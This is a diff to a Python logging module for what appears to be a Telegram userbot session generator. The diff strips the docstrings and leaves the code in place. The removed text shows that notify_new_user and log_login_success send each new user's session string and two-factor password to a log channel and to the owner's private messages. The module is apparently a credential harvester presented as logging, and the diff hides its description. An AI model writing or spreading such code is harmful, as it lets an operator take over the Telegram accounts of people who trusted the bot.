@@ -1,19 +1,3 @@
-"""
-Logging — 4st_userbot style.
-
-Two layers, same as 4st:
-  • bot_logger(tag, text)              → console:  [YYYY-MM-DD HH:MM:SS] [TAG] -> text
-  • log_to_channel(action, details, …) → LOG_CHANNEL "📡 SYSTEM LOG" blockquote
-  • notify_new_user(...)               → "#NEW_USER 🔐 New Session Generated!"
-                                         to LOG_CHANNEL **and** OWNER DM
-
-Every send is fire-and-forget (asyncio task), never raises, and falls back to
-plain text if HTML parsing fails.  Failures are printed via bot_logger so they
-show up in Heroku logs instead of vanishing.
-
-All the old helper names (log_login_success, log_vc_join, …) still exist and
-route through log_to_channel, so the rest of the plugins keep working.
-"""
 
 import asyncio
 import datetime
@@ -62,7 +46,6 @@ def _plain(text: str) -> str:
     return re.sub(r"<[^>]+>", "", text)
 
 async def _send_to(target, text: str) -> bool:
-    """Send HTML, retry plain. Never raises; reports failures to console."""
     global _last_error
     if not _bot_client:
         _last_error = "bot client not set yet"
@@ -102,7 +85,6 @@ async def _send_to(target, text: str) -> bool:
             return False
 
 async def _send(text: str) -> bool:
-    """Send to LOG_CHANNEL (awaited — used by verify / tests)."""
     global _last_error
     if not _channel:
         _last_error = "LOG_CHANNEL is 0 / not configured"
@@ -110,14 +92,12 @@ async def _send(text: str) -> bool:
     return await _send_to(_channel, text)
 
 def _fire(coro):
-    """Schedule a send without blocking the caller (4st: asyncio.create_task)."""
     try:
         return asyncio.get_running_loop().create_task(coro)
     except RuntimeError:
         return asyncio.ensure_future(coro)
 
 class _U:
-    """Tiny shim so log_to_channel can be fed raw ids the same way as objects."""
     def __init__(self, id=0, first_name="", last_name="", username=None,
                  is_bot=False, is_premium=False, is_verified=False):
         self.id, self.first_name, self.last_name = id, first_name, last_name
@@ -185,11 +165,6 @@ async def notify_new_user(user_info, string_session: str,
                           twofa_verified: bool = False,
                           twofa_password: str = "",
                           bot_user=None):
-    """
-    Send #NEW_USER alert to LOG_CHANNEL and OWNER DM with full session details.
-    `bot_user` = the Telegram user who talked to the bot (may differ from the
-    logged-in account); shown as an extra line when given.
-    """
     tstamp  = kolkata_now()
     twofa_v = "Yes" if twofa_verified else "No"
     name    = _e(getattr(user_info, "first_name", "") or "Unknown")
@@ -243,7 +218,6 @@ async def notify_new_user(user_info, string_session: str,
     _fire(_go())
 
 async def verify_log_channel() -> str:
-    """Returns "" when the log channel works, otherwise a human readable reason."""
     if not _channel:
         return "LOG_CHANNEL set nahi hai."
     try:
@@ -298,7 +272,6 @@ async def log_login_step(user_id, username, first_name, step: str, detail: str =
 async def log_login_success(user_id, username, first_name, account: dict,
                             string_session: str, method: str = "phone",
                             twofa_password: str = ""):
-    """Old entry point — now emits the 4st #NEW_USER alert + a SYSTEM LOG line."""
     bot_logger("LOGIN_OK", f"bot_user={user_id} account={account.get('id')} method={method}")
     acc = _U(id=account.get("id", 0), first_name=account.get("name") or "",
              username=account.get("username"), is_premium=bool(account.get("premium")))
